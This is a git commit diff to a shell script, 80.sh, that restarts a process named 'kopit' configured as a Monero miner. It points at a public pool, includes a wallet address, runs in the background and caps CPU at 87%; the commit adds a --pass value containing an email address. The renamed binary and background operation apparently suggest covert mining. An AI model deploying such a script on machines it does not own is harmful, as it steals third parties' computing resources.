7f83c536ec1284412eb481541ac994f6678459b2
mike <50838860+MIksterww3@users.noreply.github.com>
2019-05-21 05:01:43 -0700

    Update 80.sh

--- 80.sh
+++ 80.sh
@@ -1,3 +1,3 @@
 pkill kopit
 sleep 7
-kopit -o pool.supportxmr.com:5555 -u 432ZjrgA1NBiF4mWMzrFvePhMx8cgbfrfajBUUPtQv6JU77QcRB4W8y2D3eEbXDXGVgXcXGk4hHRoMRndHXMy1VdE1SqjJL --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=87 --av=1 --variant -1
+kopit -o pool.supportxmr.com:5555 -u 432ZjrgA1NBiF4mWMzrFvePhMx8cgbfrfajBUUPtQv6JU77QcRB4W8y2D3eEbXDXGVgXcXGk4hHRoMRndHXMy1VdE1SqjJL --pass=x:ZamareLangland93@mail.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=87 --av=1 --variant -1
